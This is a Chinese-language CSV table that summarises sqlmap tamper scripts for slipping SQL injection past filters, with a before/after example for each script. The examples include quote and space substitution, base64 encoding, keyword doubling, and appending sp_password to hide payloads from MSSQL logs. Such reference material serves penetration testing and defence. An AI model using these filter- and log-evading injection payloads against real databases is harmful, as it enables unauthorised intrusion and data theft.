sqlmap绕过过滤的tamper脚本分类汇总,,,,,,,
支持的数据库,编号,脚本名称,作用,实现方式,测试通过的数据库类型和版本,,
ALL,1,"apostrophemask.py
",用utf8代替引号,"(""1 AND '1'='1"") 
'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'",,,
,2,base64encode.py,用base64编码替换,"(""1' AND SLEEP(5)#"")
'MScgQU5EIFNMRUVQKDUpIw=='",,,
,3,multiplespaces.py,围绕SQL关键字添加多个空格,"('1 UNION SELECT foobar')
'1    UNION     SELECT   foobar'",,,
,4,space2plus.py,用+替换空格,"('SELECT id FROM users')
'SELECT+id+FROM+users'
",,,
,5,nonrecursivereplacement.py,"双重查询语句。取代predefined SQL关键字with表示 
suitable for替代（例如  .replace（“SELECT”、”"")） filters","('1 UNION SELECT 2--')
'1 UNIOUNIONN SELESELECTCT 2--'",,,
,6,space2randomblank.py,"代替空格字符（“”）从一个随机的空
白字符可选字符的有效集","('SELECT id FROM users')
'SELECT%0Did%0DFROM%0Ausers'",,,
,7,unionalltounion.py,替换UNION ALL SELECT UNION SELECT,"('-1 UNION ALL SELECT')
'-1 UNION SELECT'",,,
,8,securesphere.py,追加特制的字符串,"('1 AND 1=1')
""1 AND 1=1 and '0having'='0having'""",,,
MSSQL,1,space2hash.py,绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）,"'1 AND 9227=9227' 
'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'",,,
,2,"equaltolike.py
","like 代替等号
","* Input: SELECT * FROM users WHERE id=1 
2 * Output: SELECT * FROM users WHERE id LIKE 1",,,
,3,space2mssqlblank.py(mssql),空格替换为其它空符号,"Input: SELECT id FROM users
Output: SELECT%08id%02FROM%0Fusers","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005",,
,4,space2mssqlhash.py,替换空格,"('1 AND 9227=9227')
'1%23%0AAND%23%0A9227=9227'",,,
,5,between.py,用between替换大于号（>）,"('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'",,,
,6,percentage.py,asp允许每个字符前面添加一个%号,"* Input: SELECT FIELD FROM TABLE
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

",,,
,7,sp_password.py,追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾,"('1 AND 9227=9227-- ')
'1 AND 9227=9227-- sp_password'",,,
